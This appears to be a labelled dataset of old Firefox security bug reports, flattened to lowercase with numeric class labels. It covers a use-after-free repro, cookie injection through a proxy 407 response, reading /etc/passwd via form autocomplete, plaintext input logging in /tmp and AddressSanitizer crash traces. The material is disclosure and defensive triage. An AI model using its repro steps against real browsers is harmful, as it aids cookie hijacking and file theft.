1410h firefox 32,33 xul.dll nshtml5treeoperation use-after-free poisoned user agent mozilla/5.0 windows nt 6.3 wow64 rv:33.0 gecko/20100101 firefox/33.0 build id 20141011015303 steps to reproduce script window.onload function omenuelement document.createelement menu document.open document.insertbefore omenuelement null document.write script script n script actual results access violation around expected results synopsis firefox can be made to use data from a freed and poisoned object through specially crafted html resulting in access violations around address in x66 systems known affected versions mozilla firefox 32 33 other versions not tested attack vectors mozilla firefox 32 33 an attacker would need to get a target user to open a specially crafted webpage mitigations mozilla firefox 32 33 disabling javascript should prevent an attacker from triggering the vulnerable code path description the repro causes the nshtml5treeoperation s mone member object to be freed the freed memory is not released but poisoned by filling it with z a pointer to the freed object is kept in mone and continues to be used the repro causes xul nshtml5treeoperation perform to pass the node member of mone to xul nshtml5treeoperation appendtext as a pointer to an object but the pointer is and this will cause an access violation 687 exploit i am not sure if this is exploitable as i am not familiar with the heap management and mitigations such as poisoning of firefox i am reporting this as a security issue in case the poisoning is temporarily and the object can get released and reused or in case a heap spray could allocate memory at the address	11
jemalloc poisoning plus apple uninitialized variable usage triggers keylogging in tmp on osx 10.10 user agent mozilla/5.0 macintosh intel mac os x 10.10 rv:33.0 gecko/20100101 firefox/33.0 build id 20141027150301 steps to reproduce i m currently using firefox 33.0.2 and thunderbird 31.2.0 on macos 10.10 yosemite actual results both firefox and thunderbird are creating large log files in tmp with the filename template of cglog_program_pid ex tmp/cglog_firefox_18197 nothing special is required to cause these log files to be created however they do take some time to show up after starting the application apparently the event log builds in memory first and is flushed periodically the log file appears to contain all input events like mouse moves clicks and key-presses the mode on the file is 0644 so any process on the system could read these and thus presents a security issue especially on multi-user systems as it would contain username and password key-press data a small example of the log file is attached i did n't notice these files until after upgrading to yosemite but i m not certain that was the trigger expected results i would expect this logging would only be enabled for debug situations and when enabled the file mode should only allow the owning user to open it	0
cookie injection by proxy with 407 response user agent mozilla/5.0 macintosh intel mac os x 10_10_0 applewebkit/537.36 khtml like gecko chrome/38.0.2125.111 safari/537.36 steps to reproduce 1 set up a http proxy in firefox 2 navigate to chrome actually sends a connect request connect mail.google.com:443 http/1.1 host mail.google.com 3 the proxy responds a 407 message including set-cookie headers http/1.1 407 proxy authentication required proxy-authenticate basic realm ” auth set-cookie sid=malicious domain=.mail.google.com actual results firefox mistakenly accepts the malicious cookies expected results firefox should ignore such set-cookie headers this bug occurs in netwerk/protocol/http/nshttpchannel.cpp line 1244 1225 if mtransaction proxyconnectfailed 1226 only allow 407 authentication required to continue 1227 if httpstatus 407 1228 return processfailedproxyconnect httpstatus 1229 if proxy connect response needs to complete wait to process connection 1230 for strict-transport-security 1231 else 1232 given a successful connection process any sts data that s relevant 1233 rv processstsheader 1234 moz_assert ns_succeeded rv processstsheader failed continuing load 1235 1236 1237 moz_assert mcachedcontentisvalid 1238 1239 processsslinformation 1240 1241 notify http-on-examine-response observers 1242 ghttphandler onexamineresponse this 1243 1244 setcookie mresponsehead peekheader nshttp set_cookie	8
arbitrary file read vulnerability via form autocomplete user agent mozilla/5.0 x11 linux x86_64 rv:34.0 gecko/20100101 firefox/34.0 build id 20141201171754 steps to reproduce create a input type text field make sure that the field s autocompletion will suggest etc/passwd when triggered open the completion dropdown menu which should solely suggest etc/passwd by clicking in the text box or pressing the appropriate keys with the menu still open change the input type from text to file although the input type changed the completion menu does not dissapear and you will still be able to accept the filename as an autocompletion value after completion the file picker has changed its value to etc/passwd and will thus immediately make the file contents available to the dom confirmed on 3.17.4-1-arch x86_64 gnu/linux actual results if you try to change the value of a input field with type=file you will get a security violation error this restriction does not apply to chrome ui elements though the autocompletion box can therefore be abused the change otherwise inaccessible values and bypass the file upload dialogue the attached proof of concept outlines a possible real-life scenario which tries to minimize the necessary user interactions to a simple double click just for the record there should be several ways to conceal the whole autocompletion process even more making the attack much less obvious than depicted here but probably resulting in a less stable and bloated poc expected results the attempt of autocompleting a file upload form field should trigger a security error	2
cors request after preflight should not follow 30x redirect follow up on bug 1080987 as explained in 1 a cors reqeust after preflight should n't follow 30x redirect see spec 2 1 c3 2 cross-origin-request-with-preflight-0	2
heap-buffer-overflow write in mozilla gfx copyrect 16794==error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 16 at thread t0 web content 0 in mozilla gfx copyrect mozilla gfx datasourcesurface mozilla gfx datasourcesurface mozilla gfx intrecttyped mozilla gfx unknownunits mozilla gfx intpointtyped mozilla gfx unknownunits objdir-ff-asan/dist/include/mozilla/podoperations.h:87:3 1 in mozilla gfx filternodetilesoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:1552:7 2 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 3 in mozilla gfx filternodesoftware getinputdatasourcesurface unsigned int mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx filternodesoftware formathint mozilla gfx convolvematrixedgemode mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:698:17 4 in mozilla gfx filternodecropsoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:3004:10 5 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 6 in mozilla gfx filternodesoftware getinputdatasourcesurface unsigned int mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx filternodesoftware formathint mozilla gfx convolvematrixedgemode mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:698:17 7 in mozilla gfx filternodeunpremultiplysoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:3061:5 8 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 9 in mozilla gfx filternodesoftware getinputdatasourcesurface unsigned int mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx filternodesoftware formathint mozilla gfx convolvematrixedgemode mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:698:17 10 in mozilla gfx filternodecomponenttransfersoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:1680:5 11 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 12 in mozilla gfx filternodesoftware getinputdatasourcesurface unsigned int mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx filternodesoftware formathint mozilla gfx convolvematrixedgemode mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:698:17 13 in mozilla gfx filternodepremultiplysoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:3032:5 14 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 15 in mozilla gfx filternodesoftware draw mozilla gfx drawtarget mozilla gfx recttyped mozilla gfx unknownunits const mozilla gfx pointtyped mozilla gfx unknownunits const mozilla gfx drawoptions const gfx/2d/filternodesoftware.cpp:557:14 16 in mozilla gfx filtersupport renderfilterdescription mozilla gfx drawtarget mozilla gfx filterdescription const mozilla gfx recttyped mozilla gfx unknownunits const mozilla gfx sourcesurface mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx sourcesurface mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx sourcesurface mozilla gfx intrecttyped mozilla gfx unknownunits const nstarray mozilla refptr mozilla gfx sourcesurface mozilla gfx pointtyped mozilla gfx unknownunits const mozilla gfx drawoptions const gfx/src/filtersupport.cpp:1249:3 17 in nsfilterinstance render gfxcontext layout/svg/nsfilterinstance.cpp:486:3 18 in nsfilterinstance paintfilteredframe nsiframe gfxcontext gfxmatrix const nssvgfilterpaintcallback nsregion const layout/svg/nsfilterinstance.cpp:74:10 19 in nssvgintegrationutils paintframeswitheffects gfxcontext nsiframe nsrect const nsdisplaylistbuilder mozilla layers layermanager layout/svg/nssvgintegrationutils.cpp:543:5 20 in mozilla framelayerbuilder paintitems nstarray mozilla framelayerbuilder clippeddisplayitem nsintrect const gfxcontext nsrenderingcontext nsdisplaylistbuilder nsprescontext nsintpoint const float float int layout/base/framelayerbuilder.cpp:2665:5 21 in mozilla framelayerbuilder drawpaintedlayer mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void layout/base/framelayerbuilder.cpp:4630:5 22 in mozilla layers basicpaintedlayer paintthebes gfxcontext mozilla layers layer void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void gfx/layers/basic/basicpaintedlayer.cpp:94:7 23 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintlayercontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:724:7 24 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void gfx/layers/basic/basiclayermanager.cpp:838:5 25 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintlayercontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:737:7 26 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void gfx/layers/basic/basiclayermanager.cpp:838:5 27 in mozilla layers basiclayermanager endtransactioninternal void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void mozilla layers layermanager endtransactionflags gfx/layers/basic/basiclayermanager.cpp:528:5 28 in mozilla framelayerbuilder paintitems nstarray mozilla framelayerbuilder clippeddisplayitem nsintrect const gfxcontext nsrenderingcontext nsdisplaylistbuilder nsprescontext nsintpoint const float float int layout/base/framelayerbuilder.cpp:2670:5 29 in mozilla framelayerbuilder drawpaintedlayer mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void layout/base/framelayerbuilder.cpp:4630:5 30 in mozilla layers clientpaintedlayer paintthebes gfx/layers/client/clientpaintedlayer.cpp:76:5 31 in mozilla layers clientpaintedlayer renderlayerwithreadback mozilla layers readbackprocessor gfx/layers/client/clientpaintedlayer.cpp:131:3 32 in mozilla layers clientcontainerlayer renderlayer gfx/layers/client/clientcontainerlayer.h:69:7 33 in mozilla layers clientlayermanager endtransactioninternal void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void mozilla layers layermanager endtransactionflags gfx/layers/client/clientlayermanager.cpp:268:3 34 in mozilla layers clientlayermanager endtransaction void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void mozilla layers layermanager endtransactionflags gfx/layers/client/clientlayermanager.cpp:303:3 35 in nsdisplaylist paintroot nsdisplaylistbuilder nsrenderingcontext unsigned int layout/base/nsdisplaylist.cpp:1642:3 36 in nslayoututils paintframe nsrenderingcontext nsiframe nsregion const unsigned int unsigned int layout/base/nslayoututils.cpp:3177:5 37 in presshell paint nsview nsregion const unsigned int layout/base/nspresshell.cpp:6345:5 38 in nsviewmanager processpendingupdatespaint nsiwidget view/nsviewmanager.cpp:443:7 39 in nsviewmanager processpendingupdatesforview nsview bool view/nsviewmanager.cpp:384:9 40 in nsrefreshdriver tick long mozilla timestamp layout/base/nsrefreshdriver.cpp:1386:5 41 in mozilla refreshdrivertimer tick layout/base/nsrefreshdriver.cpp:177:5 42 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:631:7 43 in nstimerevent run xpcom/threads/nstimerimpl.cpp:724:3 44 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:855:7 45 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:265:10 46 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:99:21 47 in messageloop run ipc/chromium/src/base/message_loop.cc:233:3 48 in nsbaseappshell run widget/nsbaseappshell.cpp:164:3 49 in xre_runappshell toolkit/xre/nsembedfunctions.cpp:734:12 50 in messageloop run ipc/chromium/src/base/message_loop.cc:233:3 51 in xre_initchildprocess toolkit/xre/nsembedfunctions.cpp:571:7 52 in content_process_main int char ipc/contentproc/plugin-container.cpp:211:19 53 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 is located 0 bytes to the right of 589167-byte region allocated by thread t0 web content here 0 in interceptor_malloc asan_rtl 1 in mozilla gfx sourcesurfacealignedrawdata init mozilla gfx intsizetyped mozilla gfx unknownunits const mozilla gfx surfaceformat bool gfx/2d/tools.h:160:41 2 in mozilla gfx factory createdatasourcesurface mozilla gfx intsizetyped mozilla gfx unknownunits const mozilla gfx surfaceformat bool gfx/2d/factory.cpp:807:7 3 in mozilla gfx filternodetilesoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:1545:18 4 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 5 in mozilla gfx filternodesoftware getinputdatasourcesurface unsigned int mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx filternodesoftware formathint mozilla gfx convolvematrixedgemode mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:698:17 6 in mozilla gfx filternodecropsoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:3004:10 7 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 8 in mozilla gfx filternodesoftware getinputdatasourcesurface unsigned int mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx filternodesoftware formathint mozilla gfx convolvematrixedgemode mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:698:17 9 in mozilla gfx filternodeunpremultiplysoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:3061:5 10 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 11 in mozilla gfx filternodesoftware getinputdatasourcesurface unsigned int mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx filternodesoftware formathint mozilla gfx convolvematrixedgemode mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:698:17 12 in mozilla gfx filternodecomponenttransfersoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:1680:5 13 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 14 in mozilla gfx filternodesoftware getinputdatasourcesurface unsigned int mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx filternodesoftware formathint mozilla gfx convolvematrixedgemode mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:698:17 15 in mozilla gfx filternodepremultiplysoftware render mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:3032:5 16 in mozilla gfx filternodesoftware getoutput mozilla gfx intrecttyped mozilla gfx unknownunits const gfx/2d/filternodesoftware.cpp:604:21 17 in mozilla gfx filternodesoftware draw mozilla gfx drawtarget mozilla gfx recttyped mozilla gfx unknownunits const mozilla gfx pointtyped mozilla gfx unknownunits const mozilla gfx drawoptions const gfx/2d/filternodesoftware.cpp:557:14 18 in mozilla gfx filtersupport renderfilterdescription mozilla gfx drawtarget mozilla gfx filterdescription const mozilla gfx recttyped mozilla gfx unknownunits const mozilla gfx sourcesurface mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx sourcesurface mozilla gfx intrecttyped mozilla gfx unknownunits const mozilla gfx sourcesurface mozilla gfx intrecttyped mozilla gfx unknownunits const nstarray mozilla refptr mozilla gfx sourcesurface mozilla gfx pointtyped mozilla gfx unknownunits const mozilla gfx drawoptions const gfx/src/filtersupport.cpp:1249:3 19 in nsfilterinstance render gfxcontext layout/svg/nsfilterinstance.cpp:486:3 20 in nsfilterinstance paintfilteredframe nsiframe gfxcontext gfxmatrix const nssvgfilterpaintcallback nsregion const layout/svg/nsfilterinstance.cpp:74:10 21 in nssvgintegrationutils paintframeswitheffects gfxcontext nsiframe nsrect const nsdisplaylistbuilder mozilla layers layermanager layout/svg/nssvgintegrationutils.cpp:543:5 22 in mozilla framelayerbuilder paintitems nstarray mozilla framelayerbuilder clippeddisplayitem nsintrect const gfxcontext nsrenderingcontext nsdisplaylistbuilder nsprescontext nsintpoint const float float int layout/base/framelayerbuilder.cpp:2665:5 23 in mozilla framelayerbuilder drawpaintedlayer mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void layout/base/framelayerbuilder.cpp:4630:5 24 in mozilla layers basicpaintedlayer paintthebes gfxcontext mozilla layers layer void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void gfx/layers/basic/basicpaintedlayer.cpp:94:7 25 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintlayercontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:724:7 26 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void gfx/layers/basic/basiclayermanager.cpp:838:5 27 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintlayercontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:737:7 28 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void gfx/layers/basic/basiclayermanager.cpp:838:5 29 in mozilla layers basiclayermanager endtransactioninternal void mozilla layers paintedlayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void mozilla layers layermanager endtransactionflags gfx/layers/basic/basiclayermanager.cpp:528:5 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac asan internal fe 16794==aborting	11
out-of-bounds read in audioparamtimeline audionodeinputvalue the asan report was generated with this build asan log 32128==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t69 threaded-ml 0 in audionodeinputvalue builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/webaudio/audioparam.cpp:139 1 in getvalueattime long builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/webaudio/audioparamtimeline.h:93 2 in computecustom builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/webaudio/oscillatornode.cpp:243 3 in processinput builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/webaudio/audionodestream.cpp:492 4 in producedataforstreamsblockbyblock builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/mediastreamgraph.cpp:1229	11
heap use-after-free in mozilla dom indexeddb idbobjectstore createindex user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.36 khtml like gecko chrome/39.0.2171.95 safari/537.36 steps to reproduce open the attached html file in firefox it crashes with latest asan and also crashes on latest regular nightly for me on windows and linux this is the stacktrace i get with latest build from 2401==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 web content 0 in assign builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pbackgroundidbsharedtypes.cpp:519 1 in operator new builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/_ipdlheaders/mozilla/dom/indexeddb/pbackgroundidbsharedtypes.h:807 2 in notedeletion builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/idbobjectstore.cpp:2074 3 in createindexinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/idbobjectstore.cpp:1760 4 in createindex builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/idbobjectstore.cpp:1682 5 in createindex builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/./idbobjectstorebinding.cpp:667 6 in genericbindingmethod builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/bindings/bindingutils.cpp:2522 7 in calljsnative builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jscntxtinlines.h:226 8 in interpret builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:2558 9 in runscript builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:448 10 in invoke builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:517 11 in invoke builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:554 12 in call builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jsapi.cpp:4474 13 in call builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/./eventhandlerbinding.cpp:259 14 in call nsisupports builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/events dist/include/mozilla/dom/eventhandlerbinding.h:350 15 in handleevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/jseventhandler.cpp:214 16 in handleeventsubtype builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventlistenermanager.cpp:976 17 in handleeventinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventlistenermanager.cpp:1124 18 in handleeventtargetchain builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:299 19 in dispatch builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:633 20 in dispatchdomevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:697 21 in dispatchevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/domeventtargethelper.cpp:251 22 in dispatchsuccessevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/actorschild.cpp:751 23 in recvpbackgroundidbversionchangetransactionconstructor builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/actorschild.cpp:1406 24 in onmessagereceived builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pbackgroundidbdatabasechild.cpp:560 25 in onmessagereceived builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pbackgroundchild.cpp:761 26 in dispatchasyncmessage builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1231 27 in onmaybedequeueone builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1142 28 in runtask builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:361 29 in dowork builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:447 30 in run builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagepump.cpp:233 31 in processnextevent builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsthread.cpp:855 32 in ns_processnextevent builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/glue/nsthreadutils.cpp:265 33 in run builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagepump.cpp:99 34 in runinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:233 35 in run builds/slave/m-cen-l64-asan-000000000000000/build/src/widget/nsbaseappshell.cpp:164 36 in xre_runappshell builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsembedfunctions.cpp:738 37 in runinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:233 38 in xre_initchildprocess builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsembedfunctions.cpp:575 39 in content_process_main builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/app contentproc/plugin-container.cpp:211 40 in libc_start_main 41 in start is located 8 bytes inside of 56-byte region freed by thread t0 web content here 0 in interceptor_realloc asan_rtl 1 in moz_xrealloc builds/slave/m-cen-l64-asan-000000000000000/build/src/memory/mozalloc/mozalloc.cpp:84 2 in realloc builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/toolkit/mozapps/extensions dist/include/nstarray.h:184 3 in appendelement mozilla dom indexeddb indexmetadata builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/indexeddb dist/include/nstarray.h:1330 4 in createindexinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/idbobjectstore.cpp:1750 5 in createindex builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/idbobjectstore.cpp:1682 6 in createindex builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/./idbobjectstorebinding.cpp:667 7 in genericbindingmethod builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/bindings/bindingutils.cpp:2522 8 in calljsnative builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jscntxtinlines.h:226 9 in interpret builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:2558 10 in runscript builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:448 11 in invoke builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:517 12 in invoke builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/interpreter.cpp:554 13 in call builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jsapi.cpp:4474 14 in call builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/./eventhandlerbinding.cpp:259 15 in call nsisupports builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/events dist/include/mozilla/dom/eventhandlerbinding.h:350 16 in handleevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/jseventhandler.cpp:214 17 in handleeventsubtype builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventlistenermanager.cpp:976 18 in handleeventinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventlistenermanager.cpp:1124 19 in handleeventtargetchain builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:299 20 in dispatch builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:633 21 in dispatchdomevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/eventdispatcher.cpp:697 22 in dispatchevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/events/domeventtargethelper.cpp:251 23 in dispatchsuccessevent builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/actorschild.cpp:751 24 in recvpbackgroundidbversionchangetransactionconstructor builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/actorschild.cpp:1406 25 in onmessagereceived builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pbackgroundidbdatabasechild.cpp:560 26 in onmessagereceived builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/./pbackgroundchild.cpp:761 27 in dispatchasyncmessage builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1231 28 in onmaybedequeueone builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/messagechannel.cpp:1142 29 in runtask builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:361 previously allocated by thread t0 web content here 0 in interceptor_malloc asan_rtl 1 in moz_xmalloc builds/slave/m-cen-l64-asan-000000000000000/build/src/memory/mozalloc/mozalloc.cpp:52 2 in malloc builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/toolkit/mozapps/extensions dist/include/nstarray.h:181 3 in appendelement mozilla dom indexeddb indexmetadata builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/indexeddb dist/include/nstarray.h:1330 4 in createindexinternal builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/idbobjectstore.cpp:1750 5 in createindex builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/indexeddb/idbobjectstore.cpp:1682 6 in createindex builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/./idbobjectstorebinding.cpp:667 7 in genericbindingmethod builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/bindings/bindingutils.cpp:2522 8 in calljsnative builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jscntxtinlines.h:226 9 in interpret 